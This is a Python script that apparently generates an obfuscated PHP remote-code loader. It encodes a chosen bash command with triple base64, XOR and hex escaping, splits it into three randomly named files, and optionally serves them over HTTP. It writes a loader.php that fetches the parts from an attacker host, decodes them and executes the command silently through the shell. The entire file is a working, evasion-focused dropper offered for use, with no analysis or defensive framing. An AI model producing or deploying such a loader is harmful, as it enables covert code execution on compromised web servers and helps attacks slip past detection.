import base64
import os
import random
import string
import argparse
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse
import sys

def xor_encode(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def to_hex_escape(data):
    return ''.join(f'\\x{ord(c):02x}' for c in data)

def random_filename(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".txt"

def triple_b64_encode(cmd):
    encoded = base64.b64encode(cmd.encode())
    encoded = base64.b64encode(encoded)
    encoded = base64.b64encode(encoded)
    return encoded.decode()

def run_webserver(directory, port):
    os.chdir(directory)
    server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
    print(f"[+] Starting HTTP server at http://0.0.0.0:{port}/ serving {directory}")
    server.serve_forever()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cmd", required=True, help="Bash command to execute")
    parser.add_argument("--key", required=True, help="XOR key")
    parser.add_argument("--host", required=True, help="Host URL where PHP fetches parts (e.g., http://192.168.1.7:8000/)")
    parser.add_argument("--output-dir", default=None, help="Directory to save parts and loader.php")
    parser.add_argument("--webserver", action="store_true", help="Start a python HTTP server to serve parts")

    args = parser.parse_args()

    # Parse host URL and port
    parsed = urlparse(args.host)
    port = parsed.port if parsed.port else 8000
    scheme = parsed.scheme if parsed.scheme else "http"
    host = parsed.hostname
    # Rebuild host with port if missing
    host_url = f"{scheme}://{host}:{port}/"

    # Create output directory if specified
    out_dir = args.output_dir or os.getcwd()
    if not os.path.exists(out_dir):
        os.makedirs(out_dir)

    # Step 1: Encode bash command
    b64_payload = triple_b64_encode(args.cmd)

    # Step 2: XOR encode
    xored = xor_encode(b64_payload, args.key)

    # Step 3: Hex escape
    hex_encoded = to_hex_escape(xored)

    # Step 4: Split into 3 parts
    part_len = len(hex_encoded) // 3
    parts = [hex_encoded[i:i+part_len] for i in range(0, len(hex_encoded), part_len)]
    if len(parts) > 3:
        parts[2] += ''.join(parts[3:])
        parts = parts[:3]

    # Random filenames for parts
    filenames = [random_filename() for _ in range(3)]

    # Save parts
    for name, content in zip(filenames, parts):
        path = os.path.join(out_dir, name)
        with open(path, 'w') as f:
            f.write(content)

    print("[+] Parts saved as:")
    for name in filenames:
        print("   ", os.path.join(out_dir, name))

    # Generate PHP loader
    php = f"""<?php
$a="{args.key}";
$base_url = "{host_url}";

$b=file_get_contents($base_url . '{filenames[0]}');
$c=file_get_contents($base_url . '{filenames[1]}');
$d=file_get_contents($base_url . '{filenames[2]}');

$e=$b.$c.$d;
function h($s){{return preg_replace_callback('/\\\\\\x([0-9a-fA-F]{{2}})/',function($m){{return chr(hexdec($m[1]));}},$s);}}
function x($d,$k){{$r='';for($i=0;$i<strlen($d);$i++)$r.=$d[$i]^$k[$i%strlen($k)];return $r;}}
$f=h($e);
$g=x($f,$a);
for($i=0;$i<3;$i++)$g=base64_decode($g);
@`$g`;
?>"""

    loader_path = os.path.join(out_dir, "loader.php")
    with open(loader_path, "w") as f:
        f.write(php)

    print(f"[+] PHP loader saved as {loader_path}")

    # Start HTTP server if asked
    if args.webserver:
        print("[*] Starting HTTP server...")
        # Run server in thread so script doesn't block (or ctrl+C stops everything)
        server_thread = threading.Thread(target=run_webserver, args=(out_dir, port), daemon=True)
        server_thread.start()
        print("[*] HTTP server running. Press Ctrl+C to stop.")
        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\n[!] HTTP server stopped.")

if __name__ == "__main__":
    main()

